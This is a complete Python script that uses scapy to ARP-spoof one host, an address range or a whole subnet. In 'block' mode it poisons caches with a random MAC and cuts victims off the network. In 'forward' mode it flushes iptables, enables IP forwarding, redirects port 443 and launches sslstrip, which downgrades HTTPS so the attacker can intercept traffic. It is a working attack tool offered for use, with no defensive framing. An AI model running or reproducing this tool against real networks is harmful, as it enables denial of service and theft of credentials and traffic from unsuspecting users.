#!/usr/bin/python
import logging
import socket
from sys import argv
from os import getuid,system,popen,spawnl
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
from threading import Thread

## FUNCTIONS ##
def startSSLStrip():
	try:
		spawnl(os.P_NOWAIT,'sslstrip -s')
		print "Started sslstrip"
		return True
	except:
		print "Failed to start sslstrip"
		return False

def getGatewayIPv4():
	global gatewayIPv4Address
	return str(popen("route -n | grep 'UG' | awk '{print $2}'").read().rstrip("\r\n"))

def getGatewayMAC(ipv4):
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipv4),timeout=2,verbose=0)
	for snd,rcv in ans:
		addrmac = rcv.sprintf("%Ether.src%")
	return str(addrmac)

def getHostMAC():
	global interface
	global hostMACAddress
	tmp = "ifconfig "+interface+" | awk '/HWaddr / {print $5}'"
	addrmac = popen(tmp).read().rstrip("\r\n")
	return str(addrmac)

def generateMAC():
	global randomMAC
	mac = [0x00,0x16,0x3e,random.randint(0x00,0x7f),random.randint(0x00,0xff),random.randint(0x00,0xff)]
	return ':'.join(map(lambda x: "%02x" % x,mac))

def getTargetMAC(ipv4):
	global targetMACAddress
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipv4),timeout=2,verbose=0)
	for snd,rcv in ans:
		addrmac = rcv.sprintf("%Ether.src%")
	try:
		return str(addrmac)
	except NameError:
		return False

def setForwardingMode(mode):
	global forwardingMode
	if mode == True:
		try:
			system("sudo iptables -F")
			system("sudo iptables -P INPUT ACCEPT")
			system("sudo iptables -P OUTPUT ACCEPT")
			system("sudo iptables -P FORWARD ACCEPT")
			#system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
			system("sudo sysctl -w net.ipv4.ip_forward=1")
			#system("sudo invoke-rc.d procps restart > /dev/null 2>&1")
			system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000")
			system("sudo invoke-rc.d procps restart")
			return True
		except:
			return False
	elif mode == False:
		try:
			system("sudo iptables -F")
			system("sudo iptables -X")
			#system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")
			system("sudo sysctl -w net.ipv4.ip_forward=0")
			#system("sudo invoke-rc.d procps restart > /dev/null 2>&1")
			system("sudo invoke-rc.d procps restart")
			return True
		except:
			return False
	else:
		return False

def buildAndSend(ipv4,addrmac,mode,threading):
	global numberOfPackets
	pkt = ARP()
	pkt.op = 2
	pkt.pdst = ipv4
	pkt.psrc = gatewayIPv4Address
	pkt.hwdst = addrmac
	if mode.lower() == "block":
		pkt.hwsrc = randomMAC
	elif mode.lower() == "forward":
		pkt.hwsrc = hostMACAddress
	else:
		return False
	if threading == True:
		for i in range(int(numberOfPackets)):
			try:
				send(pkt,verbose=0)
				print "Sent ARP to %s at %s from %s at %s." % (str(pkt.pdst),str(pkt.hwdst),str(pkt.psrc),str(pkt.hwsrc))
				sleep(7)
				return True
			except:
				print "Failed to send ARP to %s at %s from %s at %s." % (str(pkt.pdst),str(pkt.hwdst),str(pkt.psrc),str(pkt.hwsrc))
				return False
	elif threading == False:
		try:
			send(pkt,verbose=0)
			print "Sent ARP to %s at %s from %s at %s." % (str(pkt.pdst),str(pkt.hwdst),str(pkt.psrc),str(pkt.hwsrc))
			return True
		except:
			print "Failed to send ARP to %s at %s from %s at %s." % (str(pkt.pdst),str(pkt.hwdst),str(pkt.psrc),str(pkt.hwsrc))
			return False
	else:
		return False

def reARP(ipv4,addrmac):
	pkt = ARP()
	pkt.op = 2
	pkt.pdst = ipv4
	pkt.psrc = gatewayIPv4Address
	pkt.hwsrc = gatewayMACAddress
	pkt.hwdst = addrmac
	try:
		send(pkt,verbose=0)
		print "Re-ARP sent to %s at %s from %s at %s." % (str(pkt.pdst),str(pkt.hwdst),str(pkt.psrc),str(pkt.hwsrc))
		return True
	except:
		print "Failed to send Re-ARP to %s at %s from %s at %s." % (str(pkt.pdst),str(pkt.hwdst),str(pkt.psrc),str(pkt.hwsrc))
		return False

## MAIN ##

if __name__ == '__main__':
	if getuid() != 0:
		print "You must be root to run this script."
		exit(1)
	if len(argv) < 3:
		print "Usage: %s <pdst> <packets> <mode>" % argv[0]
		exit(1)

	## VARIABLES ##

	interface = "wlan0"
	try:
		if str(argv[3]).lower() == "forward":
			if setForwardingMode(True) == True:
				forwardingMode = str(argv[3])
				startSSLStrip()
				pass
			else:
				print "Error setting mode."
				exit(1)
		elif str(argv[3]).lower() == "block":
			forwardingMode = str(argv[3])
			pass
		else:
			print "Forwarding mode not recognized, reverting to default (Block)."
			forwardingMode = "block"
			pass
	except:
		print "Error setting mode."
		exit(1)
	try:
		targetIPv4Address = str(argv[1])
	except:
		b1,b2,b3,b4 = getGatewayIPv4().split(".")
		targetIPv4Address = str(b1)+"."+str(b2)+"."+str(b3)+".*"
		del b1
		del b2
		del b3
		del b4
	randomMAC = generateMAC()
	hostMACAddress = getHostMAC()
	gatewayIPv4Address = getGatewayIPv4()
	gatewayMACAddress = getGatewayMAC(gatewayIPv4Address)
	try:
		numberOfPackets = argv[2]
	except:
		numberOfPackets = 50

	if str(targetIPv4Address).find(".*") != -1:
		b1,b2,b3,b4 = targetIPv4Address.split(".")
		for x in range(2,255):
			addrv4 = str(b1)+"."+str(b2)+"."+str(b3)+"."+str(x)
			try:
				buildAndSend(str(addrv4),getTargetMAC(str(addrv4)),forwardingMode,True)
			except:
				continue
	elif str(targetIPv4Address).find("-") != -1:
		b1,b2,b3,b4 = targetIPv4Address.split(".")
		target = b4.split("-",1)
		for x in range(int(numberOfPackets)):
			for x in range(int(target[0]),int(target[1])):
				addrv4 = str(b1)+"."+str(b2)+"."+str(b3)+"."+str(x)
				try:
					t = Thread(target=buildAndSend,args=(str(addrv4),getTargetMAC(str(addrv4)),forwardingMode,True))
					t.start()
				except:
					continue
	else:
		targetMACAddress = getTargetMAC(targetIPv4Address)

	try:
		for x in range(int(numberOfPackets)):
			buildAndSend(targetIPv4Address,targetMACAddress,forwardingMode,False)
			sleep(5)
		if reARP(targetIPv4Address,targetMACAddress) == True:
			pass
		else:
			exit(1)
		if forwardingMode == "forward":
			if setForwardingMode(False) == True:
				pass
			else:
				exit(1)
		exit(0)
	except KeyboardInterrupt:
		print 
		if reARP(targetIPv4Address,targetMACAddress) == True:
			pass
		else:
			exit(1)
		if forwardingMode == "forward":
			if setForwardingMode(False) == True:
				pass
			else:
				exit(1)
		#setForwardingMode(False)
		exit(0)
